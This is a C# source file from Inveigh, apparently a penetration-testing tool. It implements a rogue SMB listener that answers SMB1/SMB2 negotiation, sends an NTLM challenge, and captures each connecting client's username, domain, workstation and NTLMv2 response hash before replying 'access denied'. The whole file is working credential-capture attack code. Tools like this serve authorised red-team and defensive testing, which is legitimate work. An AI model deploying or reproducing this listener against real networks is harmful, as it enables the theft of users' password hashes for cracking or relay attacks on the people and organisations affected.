/*
 * BSD 3-Clause License
 *
 * Copyright (c) 2021, Kevin Robertson
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 * 
 * 1. Redistributions of source code must retain the above copyright notice, this
 * list of conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 * this list of conditions and the following disclaimer in the documentation
 * and/or other materials provided with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its
 * contributors may be used to endorse or promote products derived from
 * this software without specific prior written permission. 
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
 * SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
 * CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
 * OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
 * OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using Quiddity;
using Quiddity.NetBIOS;
using Quiddity.NTLM;
using Quiddity.SMB;
using Quiddity.SMB2;
using Quiddity.Support;

namespace Inveigh
{
    class SMBListener
    {
        internal void Start(int Port, IPAddress IPAddress)
        {
            TCPListener smbListener = new TCPListener();
            TcpListener tcpListener;
            IAsyncResult tcpAsync;
            TcpClient tcpClient;
            Guid guid = Guid.NewGuid();

            try
            {
                tcpListener = smbListener.Start(Port, IPAddress);
            }
            catch
            {

                lock (Program.outputList)
                {
                    Program.outputList.Add(String.Format("[!] Error starting unprivileged SMB listener, check IP and port usage.", DateTime.Now.ToString("s")));
                }

                throw;
            }

            while (!Program.exitInveigh)
            {
                tcpAsync = tcpListener.BeginAcceptTcpClient(null, null);

                do
                {
                    Thread.Sleep(10);

                    if (Program.exitInveigh)
                    {
                        break;
                    }

                }
                while (!tcpAsync.IsCompleted);

                tcpClient = tcpListener.EndAcceptTcpClient(tcpAsync);
                object[] parameters = { guid, tcpClient };
                ThreadPool.QueueUserWorkItem(new WaitCallback(ReceiveClient), parameters);
            }

        }

        internal void Start(int Port)
        {
            Start(Port, IPAddress.Any);
        }

        internal void Start(int Port, bool IPv6)
        {

            if (IPv6)
            {
                Start(Port, IPAddress.IPv6Any);
            }
            else
            {
                Start(Port, IPAddress.Any);
            }

        }

        internal void ReceiveClient(object parameters)
        {
            object[] parameterArray = parameters as object[];
            Guid serverGuid = (Guid)parameterArray[0];
            TcpClient tcpClient = (TcpClient)parameterArray[1];
            NetworkStream tcpStream = tcpClient.GetStream();
            bool isSMB2;
            string challenge = "";

            string sourceIP = ((IPEndPoint)(tcpClient.Client.RemoteEndPoint)).Address.ToString();
            string sourcePort = ((IPEndPoint)(tcpClient.Client.RemoteEndPoint)).Port.ToString();
            NetBIOSSessionService netbiosSessionServiceReceive = new NetBIOSSessionService();

            while (tcpClient.Connected)
            {
                byte[] requestData = new byte[4096];

                do
                {
                    Thread.Sleep(100);
                }
                while (!tcpStream.DataAvailable && tcpClient.Connected);

                while (tcpStream.DataAvailable)
                {
                    tcpStream.Read(requestData, 0, requestData.Length);
                }

                netbiosSessionServiceReceive = netbiosSessionServiceReceive.Read(requestData);

                if (netbiosSessionServiceReceive.Type == 0)
                {
                    SMBHelper smbHelper = new SMBHelper();
                    SMBHeader smbHeaderReceive = new SMBHeader();
                    SMB2Header smb2HeaderReceive = new SMB2Header();
                    smbHelper.ReadBytes(requestData, 4);

                    if (smbHelper.Protocol[0] == 0xfe)
                    {
                        isSMB2 = true;
                        smb2HeaderReceive.ReadBytes(requestData, 4);
                    }
                    else
                    {
                        isSMB2 = false;
                        smbHeaderReceive.ReadBytes(requestData, 4);
                    }

                    if (!isSMB2 && smbHeaderReceive.Command[0] == 0x72 || (isSMB2 && smb2HeaderReceive.Command == 0))
                    {
                        SMB2NegotiatelRequest smb2NegotiatelRequest = new SMB2NegotiatelRequest(requestData, 68);
                        SMB2Packet smb2Packet = new SMB2Packet();
                        SMB2NegotiateResponse command = new SMB2NegotiateResponse();

                        if (!isSMB2)
                        {
                            command.DialectRivision = new byte[2] { 0xff, 0x02 };
                            command.Capabilities = new byte[4] { 0x07, 0x00, 0x00, 0x00 };
                        }
                        else if (isSMB2)
                        {
                            smb2Packet.Header.MessageId = smb2HeaderReceive.MessageId;

                            if (smb2NegotiatelRequest.GetMaxDialect() == 0x311)
                            {
                                command.DialectRivision = new byte[2] { 0x11, 0x03 };
                                command.NegotiateContextCount = 3;
                                command.Capabilities = new byte[4] { 0x2f, 0x00, 0x00, 0x00 };
                                command.NegotiateContextOffset = 448;
                                command.NegotiateContextList = new SMB2NegotiateContext().GetBytes(new string[] { "1", "2", "3" });
                            }
                            else
                            {
                                command.DialectRivision = new byte[2] { 0x10, 0x02 };
                                command.Capabilities = new byte[4] { 0x07, 0x00, 0x00, 0x00 };
                            }

                            smb2Packet.Header.Reserved2 = smb2HeaderReceive.Reserved2;
                        }

                        command.Buffer = command.GetBufferBytes();
                        command.ServerGUID = serverGuid.ToByteArray();
                        smb2Packet.Payload = command;
                        smb2Packet.Write(smb2Packet, tcpStream);
                    }
                    else if (isSMB2 && smb2HeaderReceive.Command > 0)
                    {

                        switch (smb2HeaderReceive.Command)
                        {

                            case 1:
                                {
                                    SMB2SessionSetupRequest command = new SMB2SessionSetupRequest();
                                    command.ReadBytes(requestData, 68);
                                    NTLMNegotiate ntlm = new NTLMNegotiate();
                                    ntlm.Unpack(command.Buffer);

                                    if (ntlm.MessageType == 1)
                                    {
                                        SMB2Packet smb2Packet = new SMB2Packet();
                                        SMB2SessionSetupResponse sessionSetupResponse = new SMB2SessionSetupResponse();
                                        smb2Packet.Header.Status = new byte[4] { 0x16, 0x00, 0x00, 0xc0 };
                                        smb2Packet.Header.CreditCharge = 1;
                                        smb2Packet.Header.Reserved2 = smb2HeaderReceive.Reserved2;
                                        smb2Packet.Header.Command = 1;
                                        smb2Packet.Header.Flags = new byte[4] { 0x11, 0x00, 0x00, 0x00 };
                                        smb2Packet.Header.MessageId = smb2HeaderReceive.MessageId;
                                        smb2Packet.Header.SessionId = BitConverter.GetBytes(Program.smb2Session);
                                        Program.smb2Session++;
                                        sessionSetupResponse.Pack(out byte[] challengeData);
                                        smb2Packet.Payload = sessionSetupResponse;
                                        smb2Packet.Write(smb2Packet, tcpStream);
                                        challenge = BitConverter.ToString(challengeData).Replace("-", "");

                                        lock (Program.outputList)
                                        {
                                            Program.outputList.Add(String.Format("[+] [{0}] SMB({1}) NTLM challenge {2} sent to {3}:{4}", DateTime.Now.ToString("s"), 445, challenge, sourceIP, sourcePort));
                                        }

                                    }
                                    else if (ntlm.MessageType == 3)
                                    {
                                        NTLMResponse ntlmResponse = new NTLMResponse();
                                        ntlmResponse.Unpack(command.Buffer);
                                        ntlmResponse.Parse();
                                        string domain = Util.DataToString(0, ntlmResponse.DomainName.Length, ntlmResponse.DomainName);
                                        string user = Util.DataToString(0, ntlmResponse.UserName.Length, ntlmResponse.UserName);
                                        string host = Util.DataToString(0, ntlmResponse.Workstation.Length, ntlmResponse.Workstation);
                                        string response = BitConverter.ToString(ntlmResponse.NtChallengeResponse).Replace("-","");
                                        NTLM.NTLMOutput("NTLMv2", user, domain, challenge, response, sourceIP, host, "SMB", "445", sourcePort, null);
                                        SMB2Packet smb2Packet = new SMB2Packet();
                                        SMB2SessionSetupResponse sessionSetupResponse = new SMB2SessionSetupResponse();
                                        //smb2Packet.Header.Status = new byte[4] { 0x6d, 0x00, 0x00, 0xc0 };
                                        //smb2Packet.Header.Status = new byte[4] { 0x00, 0x00, 0x00, 0x00 };
                                        smb2Packet.Header.Status = new byte[4] { 0x22, 0x00, 0x00, 0xc0 }; //access denied
                                        smb2Packet.Header.CreditCharge = 1;
                                        smb2Packet.Header.Reserved2 = smb2HeaderReceive.Reserved2;
                                        smb2Packet.Header.Command = 1;
                                        smb2Packet.Header.Flags = new byte[4] { 0x11, 0x00, 0x00, 0x00 };
                                        smb2Packet.Header.MessageId = smb2HeaderReceive.MessageId;
                                        smb2Packet.Header.SessionId = smb2HeaderReceive.SessionId;
                                        sessionSetupResponse.SecurityBufferOffset = 0;
                                        smb2Packet.Payload = sessionSetupResponse;
                                        smb2Packet.Write(smb2Packet, tcpStream);
                                    }

                                }
                                break;

                        }

                    }

                }
                else
                {
                    tcpClient.Close();
                }

            }

        }

    }

}
